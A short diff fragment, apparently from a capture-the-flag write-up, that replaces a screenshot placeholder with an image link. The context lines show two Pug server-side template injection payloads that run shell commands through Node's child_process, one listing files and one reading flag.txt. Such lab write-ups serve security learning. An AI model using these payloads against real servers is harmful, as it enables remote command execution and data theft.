@@ -18,4 +18,4 @@ h1 #{process.mainModule.require('child_process').execSync('ls').toString()}
 h1 #{process.mainModule.require('child_process').execSync('cat flag.txt').toString()}
 ```
 
-[SCREEN01]
+<img width="674" height="158" alt="SCREEN01" src="https://github.com/user-attachments/assets/fda87ef8-2ddb-421b-8098-b1452856a311" />
